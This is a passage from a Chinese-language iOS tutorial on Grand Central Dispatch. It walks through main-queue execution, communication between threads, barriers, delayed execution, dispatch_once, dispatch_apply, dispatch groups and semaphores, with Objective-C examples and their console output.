<blockquote>输出结果：<br>2018-02-23 20:44:19.377321+0800 YSC-GCD-demo[20083:5040347] currentThread---&lt;NSThread: 0x600000272fc0&gt;{number = 3, name = (null)}<br>2018-02-23 20:44:19.377494+0800 YSC-GCD-demo[20083:5040347] syncMain---begin<br>2018-02-23 20:44:21.384716+0800 YSC-GCD-demo[20083:5040132] 1---&lt;NSThread: 0x60000006c900&gt;{number = 1, name = main}<br>2018-02-23 20:44:23.386091+0800 YSC-GCD-demo[20083:5040132] 1---&lt;NSThread: 0x60000006c900&gt;{number = 1, name = main}<br>2018-02-23 20:44:25.387687+0800 YSC-GCD-demo[20083:5040132] 2---&lt;NSThread: 0x60000006c900&gt;{number = 1, name = main}<br>2018-02-23 20:44:27.388648+0800 YSC-GCD-demo[20083:5040132] 2---&lt;NSThread: 0x60000006c900&gt;{number = 1, name = main}<br>2018-02-23 20:44:29.390459+0800 YSC-GCD-demo[20083:5040132] 3---&lt;NSThread: 0x60000006c900&gt;{number = 1, name = main}<br>2018-02-23 20:44:31.391965+0800 YSC-GCD-demo[20083:5040132] 3---&lt;NSThread: 0x60000006c900&gt;{number = 1, name = main}<br>2018-02-23 20:44:31.392513+0800 YSC-GCD-demo[20083:5040347] syncMain---end</blockquote>
<p>在其他线程中使用<code>同步执行 + 主队列</code>可看到：</p>
<ul>
<li>所有任务都是在主线程（非当前线程）中执行的，没有开启新的线程（所有放在<code>主队列</code>中的任务，都会放到主线程中执行）。</li>
<li>所有任务都在打印的<code>syncConcurrent---begin</code>和<code>syncConcurrent---end</code>之间执行（<code>同步任务</code>需要等待队列的任务执行结束）。</li>
<li>任务是按顺序执行的（主队列是<code>串行队列</code>，每次只有一个任务被执行，任务一个接一个按顺序执行）。</li>
</ul>
<p>为什么现在就不会卡住了呢？<br>因为<code>syncMain 任务</code>放到了其他线程里，而<code>任务1</code>、<code>任务2</code>、<code>任务3</code>都在追加到主队列中，这三个任务都会在主线程中执行。<code>syncMain 任务</code>在其他线程中执行到追加<code>任务1</code>到主队列中，因为主队列现在没有正在执行的任务，所以，会直接执行主队列的<code>任务1</code>，等<code>任务1</code>执行完毕，再接着执行<code>任务2</code>、<code>任务3</code>。所以这里不会卡住线程。</p>
<h2>4.6 异步执行 + 主队列</h2>
<ul><li>只在主线程中执行任务，执行完一个任务，再执行下一个任务。</li></ul>
<pre><code class=""objc"">/**
 * 异步执行 + 主队列
 * 特点：只在主线程中执行任务，执行完一个任务，再执行下一个任务
 */
- (void)asyncMain {
    NSLog(@""currentThread---%@"",[NSThread currentThread]);  // 打印当前线程
    NSLog(@""asyncMain---begin"");
    
    dispatch_queue_t queue = dispatch_get_main_queue();
    
    dispatch_async(queue, ^{
        // 追加任务1
        for (int i = 0; i &lt; 2; ++i) {
            [NSThread sleepForTimeInterval:2];              // 模拟耗时操作
            NSLog(@""1---%@"",[NSThread currentThread]);      // 打印当前线程
        }
    });
    
    dispatch_async(queue, ^{
        // 追加任务2
        for (int i = 0; i &lt; 2; ++i) {
            [NSThread sleepForTimeInterval:2];              // 模拟耗时操作
            NSLog(@""2---%@"",[NSThread currentThread]);      // 打印当前线程
        }
    });
    
    dispatch_async(queue, ^{
        // 追加任务3
        for (int i = 0; i &lt; 2; ++i) {
            [NSThread sleepForTimeInterval:2];              // 模拟耗时操作
            NSLog(@""3---%@"",[NSThread currentThread]);      // 打印当前线程
        }
    });
    
    NSLog(@""asyncMain---end"");
}</code></pre>
<blockquote>输出结果：<br>2018-02-23 20:45:49.981505+0800 YSC-GCD-demo[20111:5046708] currentThread---&lt;NSThread: 0x60000006d440&gt;{number = 1, name = main}<br>2018-02-23 20:45:49.981935+0800 YSC-GCD-demo[20111:5046708] asyncMain---begin<br>2018-02-23 20:45:49.982352+0800 YSC-GCD-demo[20111:5046708] asyncMain---end<br>2018-02-23 20:45:51.991096+0800 YSC-GCD-demo[20111:5046708] 1---&lt;NSThread: 0x60000006d440&gt;{number = 1, name = main}<br>2018-02-23 20:45:53.991959+0800 YSC-GCD-demo[20111:5046708] 1---&lt;NSThread: 0x60000006d440&gt;{number = 1, name = main}<br>2018-02-23 20:45:55.992937+0800 YSC-GCD-demo[20111:5046708] 2---&lt;NSThread: 0x60000006d440&gt;{number = 1, name = main}<br>2018-02-23 20:45:57.993649+0800 YSC-GCD-demo[20111:5046708] 2---&lt;NSThread: 0x60000006d440&gt;{number = 1, name = main}<br>2018-02-23 20:45:59.994928+0800 YSC-GCD-demo[20111:5046708] 3---&lt;NSThread: 0x60000006d440&gt;{number = 1, name = main}<br>2018-02-23 20:46:01.995589+0800 YSC-GCD-demo[20111:5046708] 3---&lt;NSThread: 0x60000006d440&gt;{number = 1, name = main}</blockquote>
<p>在<code>异步执行 + 主队列</code>可以看到：</p>
<ul>
<li>所有任务都是在当前线程（主线程）中执行的，并没有开启新的线程（虽然<code>异步执行</code>具备开启线程的能力，但因为是主队列，所以所有任务都在主线程中）。</li>
<li>所有任务是在打印的syncConcurrent---begin和syncConcurrent---end之后才开始执行的（异步执行不会做任何等待，可以继续执行任务）。</li>
<li>任务是按顺序执行的（因为主队列是<code>串行队列</code>，每次只有一个任务被执行，任务一个接一个按顺序执行）。</li>
</ul>
<p>弄懂了难理解、绕来绕去的<strong>队列+任务</strong>之后，我们来学习一个简单的东西：<strong>5. GCD 线程间的通信</strong>。</p>
<h1>5. GCD 线程间的通信</h1>
<p>在iOS开发过程中，我们一般在主线程里边进行UI刷新，例如：点击、滚动、拖拽等事件。我们通常把一些耗时的操作放在其他线程，比如说图片下载、文件上传等耗时操作。而当我们有时候在其他线程完成了耗时操作时，需要回到主线程，那么就用到了线程之间的通讯。</p>
<pre><code class=""objc"">/**
 * 线程间通信
 */
- (void)communication {
    // 获取全局并发队列
    dispatch_queue_t queue = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0); 
    // 获取主队列
    dispatch_queue_t mainQueue = dispatch_get_main_queue(); 
    
    dispatch_async(queue, ^{
        // 异步追加任务
        for (int i = 0; i &lt; 2; ++i) {
            [NSThread sleepForTimeInterval:2];              // 模拟耗时操作
            NSLog(@""1---%@"",[NSThread currentThread]);      // 打印当前线程
        }
        
        // 回到主线程
        dispatch_async(mainQueue, ^{
            // 追加在主线程中执行的任务
            [NSThread sleepForTimeInterval:2];              // 模拟耗时操作
            NSLog(@""2---%@"",[NSThread currentThread]);      // 打印当前线程
        });
    });
}</code></pre>
<blockquote>输出结果：<br>2018-02-23 20:47:03.462394+0800 YSC-GCD-demo[20154:5053282] 1---&lt;NSThread: 0x600000271940&gt;{number = 3, name = (null)}<br>2018-02-23 20:47:05.465912+0800 YSC-GCD-demo[20154:5053282] 1---&lt;NSThread: 0x600000271940&gt;{number = 3, name = (null)}<br>2018-02-23 20:47:07.466657+0800 YSC-GCD-demo[20154:5052953] 2---&lt;NSThread: 0x60000007bf80&gt;{number = 1, name = main}</blockquote>
<ul><li>可以看到在其他线程中先执行任务，执行完了之后回到主线程执行主线程的相应操作。</li></ul>
<h1>6. GCD 的其他方法</h1>
<h2>6.1 GCD 栅栏方法：dispatch_barrier_async</h2>
<ul><li>我们有时需要异步执行两组操作，而且第一组操作执行完之后，才能开始执行第二组操作。这样我们就需要一个相当于<code>栅栏</code>一样的一个方法将两组异步执行的操作组给分割起来，当然这里的操作组里可以包含一个或多个任务。这就需要用到<code>dispatch_barrier_async</code>方法在两个操作组间形成栅栏。</li></ul>
<p><code>dispatch_barrier_async</code>函数会等待前边追加到并发队列中的任务全部执行完毕之后，再将指定的任务追加到该异步队列中。然后在<code>dispatch_barrier_async</code>函数追加的任务执行完毕之后，异步队列才恢复为一般动作，接着追加任务到该异步队列并开始执行。具体如下图所示：<br><span class=""img-wrap""><img data-src=""/img/remote/1460000014850425"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""dispatch_barrier_async.png"" title=""dispatch_barrier_async.png""></span></p>
<pre><code class=""objc"">/**
 * 栅栏方法 dispatch_barrier_async
 */
- (void)barrier {
    dispatch_queue_t queue = dispatch_queue_create(""net.bujige.testQueue"", DISPATCH_QUEUE_CONCURRENT);
    
    dispatch_async(queue, ^{
        // 追加任务1
        for (int i = 0; i &lt; 2; ++i) {
            [NSThread sleepForTimeInterval:2];              // 模拟耗时操作
            NSLog(@""1---%@"",[NSThread currentThread]);      // 打印当前线程
        }
    });
    dispatch_async(queue, ^{
        // 追加任务2
        for (int i = 0; i &lt; 2; ++i) {
            [NSThread sleepForTimeInterval:2];              // 模拟耗时操作
            NSLog(@""2---%@"",[NSThread currentThread]);      // 打印当前线程
        }
    });
    
    dispatch_barrier_async(queue, ^{
        // 追加任务 barrier
        for (int i = 0; i &lt; 2; ++i) {
            [NSThread sleepForTimeInterval:2];              // 模拟耗时操作
            NSLog(@""barrier---%@"",[NSThread currentThread]);// 打印当前线程
        }
    });
    
    dispatch_async(queue, ^{
        // 追加任务3
        for (int i = 0; i &lt; 2; ++i) {
            [NSThread sleepForTimeInterval:2];              // 模拟耗时操作
            NSLog(@""3---%@"",[NSThread currentThread]);      // 打印当前线程
        }
    });
    dispatch_async(queue, ^{
        // 追加任务4
        for (int i = 0; i &lt; 2; ++i) {
            [NSThread sleepForTimeInterval:2];              // 模拟耗时操作
            NSLog(@""4---%@"",[NSThread currentThread]);      // 打印当前线程
        }
    });
}</code></pre>
<blockquote>输出结果：<br>2018-02-23 20:48:18.297745+0800 YSC-GCD-demo[20188:5059274] 1---&lt;NSThread: 0x600000079d80&gt;{number = 4, name = (null)}<br>2018-02-23 20:48:18.297745+0800 YSC-GCD-demo[20188:5059273] 2---&lt;NSThread: 0x600000079e00&gt;{number = 3, name = (null)}<br>2018-02-23 20:48:20.301139+0800 YSC-GCD-demo[20188:5059274] 1---&lt;NSThread: 0x600000079d80&gt;{number = 4, name = (null)}<br>2018-02-23 20:48:20.301139+0800 YSC-GCD-demo[20188:5059273] 2---&lt;NSThread: 0x600000079e00&gt;{number = 3, name = (null)}<br>2018-02-23 20:48:22.306290+0800 YSC-GCD-demo[20188:5059274] barrier---&lt;NSThread: 0x600000079d80&gt;{number = 4, name = (null)}<br>2018-02-23 20:48:24.311655+0800 YSC-GCD-demo[20188:5059274] barrier---&lt;NSThread: 0x600000079d80&gt;{number = 4, name = (null)}<br>2018-02-23 20:48:26.316943+0800 YSC-GCD-demo[20188:5059273] 4---&lt;NSThread: 0x600000079e00&gt;{number = 3, name = (null)}<br>2018-02-23 20:48:26.316956+0800 YSC-GCD-demo[20188:5059274] 3---&lt;NSThread: 0x600000079d80&gt;{number = 4, name = (null)}<br>2018-02-23 20:48:28.320660+0800 YSC-GCD-demo[20188:5059273] 4---&lt;NSThread: 0x600000079e00&gt;{number = 3, name = (null)}<br>2018-02-23 20:48:28.320649+0800 YSC-GCD-demo[20188:5059274] 3---&lt;NSThread: 0x600000079d80&gt;{number = 4, name = (null)}</blockquote>
<p>在<code>dispatch_barrier_async</code>执行结果中可以看出：</p>
<ul><li>在执行完栅栏前面的操作之后，才执行栅栏操作，最后再执行栅栏后边的操作。</li></ul>
<h2>6.2 GCD 延时执行方法：dispatch_after</h2>
<p>我们经常会遇到这样的需求：在指定时间（例如3秒）之后执行某个任务。可以用 GCD 的<code>dispatch_after</code>函数来实现。<br>需要注意的是：<code>dispatch_after</code>函数并不是在指定时间之后才开始执行处理，而是在指定时间之后将任务追加到主队列中。严格来说，这个时间并不是绝对准确的，但想要大致延迟执行任务，<code>dispatch_after</code>函数是很有效的。</p>
<pre><code class=""objc"">/**
 * 延时执行方法 dispatch_after
 */
- (void)after {
    NSLog(@""currentThread---%@"",[NSThread currentThread]);  // 打印当前线程
    NSLog(@""asyncMain---begin"");
    
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        // 2.0秒后异步追加任务代码到主队列，并开始执行
        NSLog(@""after---%@"",[NSThread currentThread]);  // 打印当前线程
    });
}</code></pre>
<blockquote>输出结果：<br>2018-02-23 20:53:08.713784+0800 YSC-GCD-demo[20282:5080295] currentThread---&lt;NSThread: 0x60000006ee00&gt;{number = 1, name = main}<br>2018-02-23 20:53:08.713962+0800 YSC-GCD-demo[20282:5080295] asyncMain---begin<br>2018-02-23 20:53:10.714283+0800 YSC-GCD-demo[20282:5080295] after---&lt;NSThread: 0x60000006ee00&gt;{number = 1, name = main}</blockquote>
<p>可以看出：在打印 <code>asyncMain---begin</code> 之后大约 2.0 秒的时间，打印了 <code>after---&lt;NSThread: 0x60000006ee00&gt;{number = 1, name = main}</code></p>
<h2>6.3 GCD 一次性代码（只执行一次）：dispatch_once</h2>
<ul><li>我们在创建单例、或者有整个程序运行过程中只执行一次的代码时，我们就用到了 GCD 的 <code>dispatch_once</code> 函数。使用<br><code>dispatch_once</code> 函数能保证某段代码在程序运行过程中只被执行1次，并且即使在多线程的环境下，<code>dispatch_once</code>也可以保证线程安全。</li></ul>
<pre><code class=""objc"">/**
 * 一次性代码（只执行一次）dispatch_once
 */
- (void)once {
    static dispatch_once_t onceToken;
    dispatch_once(&amp;onceToken, ^{
        // 只执行1次的代码(这里面默认是线程安全的)
    });
}</code></pre>
<h2>6.4 GCD 快速迭代方法：dispatch_apply</h2>
<ul><li>通常我们会用 for 循环遍历，但是 GCD 给我们提供了快速迭代的函数<code>dispatch_apply</code>。<code>dispatch_apply</code>按照指定的次数将指定的任务追加到指定的队列中，并等待全部队列执行结束。</li></ul>
<p>如果是在串行队列中使用 <code>dispatch_apply</code>，那么就和 for 循环一样，按顺序同步执行。可这样就体现不出快速迭代的意义了。<br>我们可以利用并发队列进行异步执行。比如说遍历 0~5 这6个数字，for 循环的做法是每次取出一个元素，逐个遍历。<code>dispatch_apply</code> 可以 在多个线程中同时（异步）遍历多个数字。<br>还有一点，无论是在串行队列，还是异步队列中，dispatch_apply 都会等待全部任务执行完毕，这点就像是同步操作，也像是队列组中的 <code>dispatch_group_wait</code>方法。</p>
<pre><code class=""objc"">/**
 * 快速迭代方法 dispatch_apply
 */
- (void)apply {
    dispatch_queue_t queue = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);
    
    NSLog(@""apply---begin"");
    dispatch_apply(6, queue, ^(size_t index) {
        NSLog(@""%zd---%@"",index, [NSThread currentThread]);
    });
    NSLog(@""apply---end"");
}</code></pre>
<blockquote>输出结果：<br>2018-02-23 22:03:18.475499+0800 YSC-GCD-demo[20470:5176805] apply---begin<br>2018-02-23 22:03:18.476672+0800 YSC-GCD-demo[20470:5177035] 1---&lt;NSThread: 0x60000027b8c0&gt;{number = 3, name = (null)}<br>2018-02-23 22:03:18.476693+0800 YSC-GCD-demo[20470:5176805] 0---&lt;NSThread: 0x604000070640&gt;{number = 1, name = main}<br>2018-02-23 22:03:18.476704+0800 YSC-GCD-demo[20470:5177037] 2---&lt;NSThread: 0x604000276800&gt;{number = 4, name = (null)}<br>2018-02-23 22:03:18.476735+0800 YSC-GCD-demo[20470:5177036] 3---&lt;NSThread: 0x60000027b800&gt;{number = 5, name = (null)}<br>2018-02-23 22:03:18.476867+0800 YSC-GCD-demo[20470:5177035] 4---&lt;NSThread: 0x60000027b8c0&gt;{number = 3, name = (null)}<br>2018-02-23 22:03:18.476867+0800 YSC-GCD-demo[20470:5176805] 5---&lt;NSThread: 0x604000070640&gt;{number = 1, name = main}<br>2018-02-23 22:03:18.477038+0800 YSC-GCD-demo[20470:5176805] apply---end</blockquote>
<p>因为是在并发队列中异步执行任务，所以各个任务的执行时间长短不定，最后结束顺序也不定。但是<code>apply---end</code>一定在最后执行。这是因为<code>dispatch_apply</code>函数会等待全部任务执行完毕。</p>
<h2>6.5 GCD 队列组：dispatch_group</h2>
<p>有时候我们会有这样的需求：分别异步执行2个耗时任务，然后当2个耗时任务都执行完毕后再回到主线程执行任务。这时候我们可以用到 GCD 的队列组。</p>
<ul>
<li>调用队列组的 <code>dispatch_group_async</code> 先把任务放到队列中，然后将队列放入队列组中。或者使用队列组的 <code>dispatch_group_enter、dispatch_group_leave</code> 组合 来实现<br><code>dispatch_group_async</code>。</li>
<li>调用队列组的 <code>dispatch_group_notify</code> 回到指定线程执行任务。或者使用 <code>dispatch_group_wait </code> 回到当前线程继续向下执行（会阻塞当前线程）。</li>
</ul>
<h3>6.5.1 dispatch_group_notify</h3>
<ul><li>监听 group 中任务的完成状态，当所有的任务都执行完成后，追加任务到 group 中，并执行任务。</li></ul>
<pre><code class=""objc"">/**
 * 队列组 dispatch_group_notify
 */
- (void)groupNotify {
    NSLog(@""currentThread---%@"",[NSThread currentThread]);  // 打印当前线程
    NSLog(@""group---begin"");
    
    dispatch_group_t group =  dispatch_group_create();
    
    dispatch_group_async(group, dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        // 追加任务1
        for (int i = 0; i &lt; 2; ++i) {
            [NSThread sleepForTimeInterval:2];              // 模拟耗时操作
            NSLog(@""1---%@"",[NSThread currentThread]);      // 打印当前线程
        }
    });
    
    dispatch_group_async(group, dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        // 追加任务2
        for (int i = 0; i &lt; 2; ++i) {
            [NSThread sleepForTimeInterval:2];              // 模拟耗时操作
            NSLog(@""2---%@"",[NSThread currentThread]);      // 打印当前线程
        }
    });
    
    dispatch_group_notify(group, dispatch_get_main_queue(), ^{
        // 等前面的异步任务1、任务2都执行完毕后，回到主线程执行下边任务
        for (int i = 0; i &lt; 2; ++i) {
            [NSThread sleepForTimeInterval:2];              // 模拟耗时操作
            NSLog(@""3---%@"",[NSThread currentThread]);      // 打印当前线程
        }
        NSLog(@""group---end"");
    });
}</code></pre>
<blockquote>输出结果：<br>2018-02-23 22:05:03.790035+0800 YSC-GCD-demo[20494:5183349] currentThread---&lt;NSThread: 0x604000072040&gt;{number = 1, name = main}<br>2018-02-23 22:05:03.790237+0800 YSC-GCD-demo[20494:5183349] group---begin<br>2018-02-23 22:05:05.792721+0800 YSC-GCD-demo[20494:5183654] 1---&lt;NSThread: 0x60000026f280&gt;{number = 4, name = (null)}<br>2018-02-23 22:05:05.792725+0800 YSC-GCD-demo[20494:5183656] 2---&lt;NSThread: 0x60000026f240&gt;{number = 3, name = (null)}<br>2018-02-23 22:05:07.797408+0800 YSC-GCD-demo[20494:5183656] 2---&lt;NSThread: 0x60000026f240&gt;{number = 3, name = (null)}<br>2018-02-23 22:05:07.797408+0800 YSC-GCD-demo[20494:5183654] 1---&lt;NSThread: 0x60000026f280&gt;{number = 4, name = (null)}<br>2018-02-23 22:05:09.798717+0800 YSC-GCD-demo[20494:5183349] 3---&lt;NSThread: 0x604000072040&gt;{number = 1, name = main}<br>2018-02-23 22:05:11.799827+0800 YSC-GCD-demo[20494:5183349] 3---&lt;NSThread: 0x604000072040&gt;{number = 1, name = main}<br>2018-02-23 22:05:11.799977+0800 YSC-GCD-demo[20494:5183349] group---end</blockquote>
<p>从<code>dispatch_group_notify</code>相关代码运行输出结果可以看出：<br>当所有任务都执行完成之后，才执行<code>dispatch_group_notify</code> block 中的任务。</p>
<h3>6.5.2 dispatch_group_wait</h3>
<ul><li>暂停当前线程（阻塞当前线程），等待指定的 group 中的任务执行完成后，才会往下继续执行。</li></ul>
<pre><code class=""objc"">/**
 * 队列组 dispatch_group_wait
 */
- (void)groupWait {
    NSLog(@""currentThread---%@"",[NSThread currentThread]);  // 打印当前线程
    NSLog(@""group---begin"");
    
    dispatch_group_t group =  dispatch_group_create();
    
    dispatch_group_async(group, dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        // 追加任务1
        for (int i = 0; i &lt; 2; ++i) {
            [NSThread sleepForTimeInterval:2];              // 模拟耗时操作
            NSLog(@""1---%@"",[NSThread currentThread]);      // 打印当前线程
        }
    });
    
    dispatch_group_async(group, dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        // 追加任务2
        for (int i = 0; i &lt; 2; ++i) {
            [NSThread sleepForTimeInterval:2];              // 模拟耗时操作
            NSLog(@""2---%@"",[NSThread currentThread]);      // 打印当前线程
        }
    });
    
    // 等待上面的任务全部完成后，会往下继续执行（会阻塞当前线程）
    dispatch_group_wait(group, DISPATCH_TIME_FOREVER);
    
    NSLog(@""group---end"");
}</code></pre>
<blockquote>输出结果：<br>2018-02-23 22:10:16.939258+0800 YSC-GCD-demo[20538:5198871] currentThread---&lt;NSThread: 0x600000066780&gt;{number = 1, name = main}<br>2018-02-23 22:10:16.939455+0800 YSC-GCD-demo[20538:5198871] group---begin<br>2018-02-23 22:10:18.943862+0800 YSC-GCD-demo[20538:5199137] 2---&lt;NSThread: 0x600000464b80&gt;{number = 4, name = (null)}<br>2018-02-23 22:10:18.943861+0800 YSC-GCD-demo[20538:5199138] 1---&lt;NSThread: 0x604000076640&gt;{number = 3, name = (null)}<br>2018-02-23 22:10:20.947787+0800 YSC-GCD-demo[20538:5199137] 2---&lt;NSThread: 0x600000464b80&gt;{number = 4, name = (null)}<br>2018-02-23 22:10:20.947790+0800 YSC-GCD-demo[20538:5199138] 1---&lt;NSThread: 0x604000076640&gt;{number = 3, name = (null)}<br>2018-02-23 22:10:20.948134+0800 YSC-GCD-demo[20538:5198871] group---end</blockquote>
<p>从<code>dispatch_group_wait</code>相关代码运行输出结果可以看出：<br>当所有任务执行完成之后，才执行 <code>dispatch_group_wait</code> 之后的操作。但是，使用<code>dispatch_group_wait</code> 会阻塞当前线程。</p>
<h3>6.5.3 dispatch_group_enter、dispatch_group_leave</h3>
<ul>
<li>
<code>dispatch_group_enter</code> 标志着一个任务追加到 group，执行一次，相当于 group 中未执行完毕任务数+1</li>
<li>
<code>dispatch_group_leave</code> 标志着一个任务离开了 group，执行一次，相当于 group 中未执行完毕任务数-1。</li>
<li>当 group 中未执行完毕任务数为0的时候，才会使<code>dispatch_group_wait</code>解除阻塞，以及执行追加到<code>dispatch_group_notify</code>中的任务。</li>
</ul>
<pre><code class=""objc"">/**
 * 队列组 dispatch_group_enter、dispatch_group_leave
 */
- (void)groupEnterAndLeave
{
    NSLog(@""currentThread---%@"",[NSThread currentThread]);  // 打印当前线程
    NSLog(@""group---begin"");
    
    dispatch_group_t group = dispatch_group_create();
    dispatch_queue_t queue = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);
    dispatch_group_enter(group);
    dispatch_async(queue, ^{
        // 追加任务1
        for (int i = 0; i &lt; 2; ++i) {
            [NSThread sleepForTimeInterval:2];              // 模拟耗时操作
            NSLog(@""1---%@"",[NSThread currentThread]);      // 打印当前线程
        }
        dispatch_group_leave(group);
    });
    
    dispatch_group_enter(group);
    dispatch_async(queue, ^{
        // 追加任务2
        for (int i = 0; i &lt; 2; ++i) {
            [NSThread sleepForTimeInterval:2];              // 模拟耗时操作
            NSLog(@""2---%@"",[NSThread currentThread]);      // 打印当前线程
        }
        dispatch_group_leave(group);
    });
    
    dispatch_group_notify(group, dispatch_get_main_queue(), ^{
        // 等前面的异步操作都执行完毕后，回到主线程.
        for (int i = 0; i &lt; 2; ++i) {
            [NSThread sleepForTimeInterval:2];              // 模拟耗时操作
            NSLog(@""3---%@"",[NSThread currentThread]);      // 打印当前线程
        }
        NSLog(@""group---end"");
    });
    
//    // 等待上面的任务全部完成后，会往下继续执行（会阻塞当前线程）
//    dispatch_group_wait(group, DISPATCH_TIME_FOREVER);
//
//    NSLog(@""group---end"");
}</code></pre>
<blockquote>输出结果：<br>2018-02-23 22:14:17.997667+0800 YSC-GCD-demo[20592:5214830] currentThread---&lt;NSThread: 0x604000066600&gt;{number = 1, name = main}<br>2018-02-23 22:14:17.997839+0800 YSC-GCD-demo[20592:5214830] group---begin<br>2018-02-23 22:14:20.000298+0800 YSC-GCD-demo[20592:5215094] 1---&lt;NSThread: 0x600000277c80&gt;{number = 4, name = (null)}<br>2018-02-23 22:14:20.000305+0800 YSC-GCD-demo[20592:5215095] 2---&lt;NSThread: 0x600000277c40&gt;{number = 3, name = (null)}<br>2018-02-23 22:14:22.001323+0800 YSC-GCD-demo[20592:5215094] 1---&lt;NSThread: 0x600000277c80&gt;{number = 4, name = (null)}<br>2018-02-23 22:14:22.001339+0800 YSC-GCD-demo[20592:5215095] 2---&lt;NSThread: 0x600000277c40&gt;{number = 3, name = (null)}<br>2018-02-23 22:14:24.002321+0800 YSC-GCD-demo[20592:5214830] 3---&lt;NSThread: 0x604000066600&gt;{number = 1, name = main}<br>2018-02-23 22:14:26.002852+0800 YSC-GCD-demo[20592:5214830] 3---&lt;NSThread: 0x604000066600&gt;{number = 1, name = main}<br>2018-02-23 22:14:26.003116+0800 YSC-GCD-demo[20592:5214830] group---end</blockquote>
<p>从<code>dispatch_group_enter、dispatch_group_leave</code>相关代码运行结果中可以看出：当所有任务执行完成之后，才执行 dispatch_group_notify 中的任务。这里的<code>dispatch_group_enter、dispatch_group_leave</code>组合，其实等同于<code>dispatch_group_async</code>。</p>
<h2>6.6 GCD 信号量：dispatch_semaphore</h2>
<p>GCD 中的信号量是指 <strong>Dispatch Semaphore</strong>，是持有计数的信号。类似于过高速路收费站的栏杆。可以通过时，打开栏杆，不可以通过时，关闭栏杆。在 <strong>Dispatch Semaphore</strong> 中，使用计数来完成这个功能，计数为0时等待，不可通过。计数为1或大于1时，计数减1且不等待，可通过。<br><strong>Dispatch Semaphore</strong> 提供了三个函数。</p>
<ul>
<li>
<code>dispatch_semaphore_create</code>：创建一个Semaphore并初始化信号的总量</li>
<li>
<code>dispatch_semaphore_signal</code>：发送一个信号，让信号总量加1</li>
<li>
<code>dispatch_semaphore_wait</code>：可以使总信号量减1，当信号总量为0时就会一直等待（阻塞所在线程），否则就可以正常执行。</li>
</ul>
<blockquote>注意：信号量的使用前提是：想清楚你需要处理哪个线程等待（阻塞），又要哪个线程继续执行，然后使用信号量。</blockquote>
<p>Dispatch Semaphore 在实际开发中主要用于：</p>
<ul>
<li>保持线程同步，将异步执行任务转换为同步执行任务</li>
<li>保证线程安全，为线程加锁</li>
</ul>
<h3>6.6.1 Dispatch Semaphore 线程同步</h3>
<p>我们在开发中，会遇到这样的需求：异步执行耗时任务，并使用异步执行的结果进行一些额外的操作。换句话说，相当于，将将异步执行任务转换为同步执行任务。比如说：AFNetworking 中 AFURLSessionManager.m 里面的 <code>tasksForKeyPath:</code> 方法。通过引入信号量的方式，等待异步执行任务结果，获取到 tasks，然后再返回该 tasks。</p>
<pre><code class=""objc"">- (NSArray *)tasksForKeyPath:(NSString *)keyPath {
    __block NSArray *tasks = nil;
    dispatch_semaphore_t semaphore = dispatch_semaphore_create(0);
    [self.session getTasksWithCompletionHandler:^(NSArray *dataTasks, NSArray *uploadTasks, NSArray *downloadTasks) {
        if ([keyPath isEqualToString:NSStringFromSelector(@selector(dataTasks))]) {
            tasks = dataTasks;
        } else if ([keyPath isEqualToString:NSStringFromSelector(@selector(uploadTasks))]) {
            tasks = uploadTasks;
        } else if ([keyPath isEqualToString:NSStringFromSelector(@selector(downloadTasks))]) {
            tasks = downloadTasks;
        } else if ([keyPath isEqualToString:NSStringFromSelector(@selector(tasks))]) {
            tasks = [@[dataTasks, uploadTasks, downloadTasks] valueForKeyPath:@""@unionOfArrays.self""];
        }

        dispatch_semaphore_signal(semaphore);
    }];

    dispatch_semaphore_wait(semaphore, DISPATCH_TIME_FOREVER);

    return tasks;
}</code></pre>
<p>下面，我们来利用 Dispatch Semaphore 实现线程同步，将异步执行任务转换为同步执行任务。</p>
<pre><code class=""objc"">/**
 * semaphore 线程同步
 */
- (void)semaphoreSync {
    
    NSLog(@""currentThread---%@"",[NSThread currentThread]);  // 打印当前线程
    NSLog(@""semaphore---begin"");
    
    dispatch_queue_t queue = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);
    dispatch_semaphore_t semaphore = dispatch_semaphore_create(0);
    
    __block int number = 0;
    dispatch_async(queue, ^{
        // 追加任务1
        [NSThread sleepForTimeInterval:2];              // 模拟耗时操作
        NSLog(@""1---%@"",[NSThread currentThread]);      // 打印当前线程
        
        number = 100;
        
        dispatch_semaphore_signal(semaphore);
    });
    
    dispatch_semaphore_wait(semaphore, DISPATCH_TIME_FOREVER);
    NSLog(@""semaphore---end,number = %zd"",number);
}</code></pre>
<blockquote>输出结果：<br>2018-02-23 22:22:26.521665+0800 YSC-GCD-demo[20642:5246341] currentThread---&lt;NSThread: 0x60400006bc80&gt;{number = 1, name = main}<br>2018-02-23 22:22:26.521869+0800 YSC-GCD-demo[20642:5246341] semaphore---begin<br>2018-02-23 22:22:28.526841+0800 YSC-GCD-demo[20642:5246638] 1---&lt;NSThread: 0x600000272300&gt;{number = 3, name = (null)}<br>2018-02-23 22:22:28.527030+0800 YSC-GCD-demo[20642:5246341] semaphore---end,number = 100</blockquote>
<p>从 Dispatch Semaphore 实现线程同步的代码可以看到：</p>
<ul><li>
<code>semaphore---end</code> 是在执行完  <code>number = 100;</code> 之后才打印的。而且输出结果 number 为 100。</li></ul>
<p>这是因为<code>异步执行</code>不会做任何等待，可以继续执行任务。<code>异步执行</code>将任务1追加到队列之后，不做等待，接着执行<code>dispatch_semaphore_wait</code>方法。此时 semaphore == 0，当前线程进入等待状态。然后，异步任务1开始执行。任务1执行到<code>dispatch_semaphore_signal</code>之后，总信号量，此时 semaphore == 1，<code>dispatch_semaphore_wait</code>方法使总信号量减1，正在被阻塞的线程（主线程）恢复继续执行。最后打印<code>semaphore---end,number = 100</code>。这样就实现了线程同步，将异步执行任务转换为同步执行任务。</p>
<h3>6.6.2 Dispatch Semaphore 线程安全和线程同步（为线程加锁）</h3>
